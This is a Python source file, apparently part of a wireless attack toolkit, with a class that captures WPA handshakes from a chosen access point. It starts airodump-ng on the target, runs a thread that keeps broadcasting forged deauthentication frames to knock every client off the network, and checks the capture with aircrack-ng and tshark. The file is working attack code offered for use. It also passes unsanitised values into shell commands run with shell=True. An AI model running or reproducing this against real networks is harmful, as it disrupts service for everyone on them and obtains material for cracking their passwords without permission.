import os
import time
import signal
import subprocess
import threading
from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
from datetime import datetime
from modules.wifi_base import WifiBase

class CaptureHandshake(WifiBase):
    def __init__(self, interface='wlan0', debug=False):
        super().__init__(interface, debug)
        self.capture_process = None
        self.capture_prefix = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self._deauth_thread = None
        self._deauth_stop_event = threading.Event()
        
    def capture_handshake(self, bssid, channel, deauth_packets=25, capture_duration=30, deauth_interval=5):
        #this will attempt to capture handshake
        if not self.set_interface_channel(channel):
            return None

        capture_file = self.start_capture(bssid, channel)
        if not capture_file:
            return None

        # start deauth thread
        self._start_deauth_thread(bssid, deauth_packets, deauth_interval)
        
        #wait for the handshake
        self.log_message(f"Capturing for {capture_duration} seconds...")
        time.sleep(capture_duration)
        
        #stop caputring 
        self.stop_capture()
        
        # stop deauth thread
        self._stop_deauth_thread()
        
        #verify the handshake
        if self._verify_handshake(capture_file, bssid):
            self.log_message("Successfully captured handshake!")
            return capture_file
        
        self.log_message("Failed to capture handshake", 'warning')
        return None
    
    def set_interface_channel(self, channel):
        self.log_message(f"Setting interface to channel {channel}...")
        result = self.run_cmd(f"iwconfig {self.interface} channel {channel}")
        return result is not False
    
    def start_capture(self, bssid, channel):
        #start capturing on the channel
        self.log_message(f"Starting capture on channel {channel} for BSSID {bssid}...")
        capture_cmd = (
            f"airodump-ng -c {channel} --bssid {bssid} "
            f"-w {self.capture_prefix} {self.interface} --output-format pcap"
        )
        try:
            self.capture_process = subprocess.Popen(
                capture_cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            time.sleep(8)  # Allow capture to initialize
            return f"{self.capture_prefix}-01.cap"
        except Exception as error:
            self.log_message(f"Failed to start capture: {str(error)}", 'error')
            return None
            
    def _send_deauth_packets(self, bssid, count):
        #send deauth packets
        self.log_message(f"Sending {count} deauthentication packets...")
        try:
            packet = RadioTap() / Dot11(
                addr1="ff:ff:ff:ff:ff:ff", #Target all devices in the network(hehe)
                addr2=bssid,
                addr3=bssid
            ) / Dot11Deauth(reason=7)
            
            sendp(
                packet,
                iface=self.interface,
                count=count,
                inter=0.1,
                verbose=0
            )
        except Exception as error:
            self.log_message(f"Failed to send deauth packets: {str(error)}", 'error')
    
    def _deauth_loop(self, bssid, count, interval):
        while not self._deauth_stop_event.is_set():
            self._send_deauth_packets(bssid, count)
            # Sleep for interval, but wake early if stop is set
            if self._deauth_stop_event.wait(interval):
                break

    def _start_deauth_thread(self, bssid, count, interval):
        #start a background thread to send deauth packets periodically
        self._deauth_stop_event.clear()
        self._deauth_thread = threading.Thread(
            target=self._deauth_loop, args=(bssid, count, interval), daemon=True
        )
        self._deauth_thread.start()

    def _stop_deauth_thread(self):
        #stop the deauth thread
        if self._deauth_thread and self._deauth_thread.is_alive():
            self._deauth_stop_event.set()
            self._deauth_thread.join()
        self._deauth_thread = None

    def _verify_handshake(self, pcap_file, bssid):
        #Check if the capture file contains a valid handshake.
        if not os.path.exists(pcap_file):
            self.log_message("Capture file not found.", "error")
            return False

        check_cmd = f"aircrack-ng -a2 -b {bssid} {pcap_file}"
        result = self.run_cmd(check_cmd)
        #Look for 'WPA handshake' in the output for the target BSSID
        if result and f"WPA (1 handshake)" in result:
            return True
        if result and "WPA handshake" in result:
            return True
        return False
    
    def stop_capture(self):
        if hasattr(self, "capture_process") and self.capture_process:
            try:
                os.killpg(os.getpgid(self.capture_process.pid), signal.SIGTERM)
                self.log_message("Capture process terminated successfully.")
            except Exception as error:
                self.log_message(f"Failed to stop capture process: {str(error)}", 'error')
            finally:
                self.capture_process = None

    def check_capture_for_beacon_and_handshake(self, capture_file, bssid):
        """
        Checks if the capture file contains beacon frames and EAPOL handshakes for the given BSSID.
        Returns (has_beacon, has_handshake)
        """
        # Check for beacon frames
        beacon_cmd = [
            "tshark", "-r", capture_file,
            "-Y", f"wlan.fc.type_subtype == 8 && wlan.bssid == {bssid}",
            "-c", "1"
        ]
        beacon_result = subprocess.run(beacon_cmd, capture_output=True, text=True)
        has_beacon = bool(beacon_result.stdout.strip())

        # Check for EAPOL handshake packets
        eapol_cmd = [
            "tshark", "-r", capture_file,
            "-Y", f"eapol && wlan.bssid == {bssid}",
            "-c", "1"
        ]
        eapol_result = subprocess.run(eapol_cmd, capture_output=True, text=True)
        has_handshake = bool(eapol_result.stdout.strip())

        self.log_message(
            f"Beacon present for {bssid}: {'YES' if has_beacon else 'NO'}"
        )
        self.log_message(
            f"Handshake (EAPOL) present for {bssid}: {'YES' if has_handshake else 'NO'}"
        )
        return has_beacon, has_handshake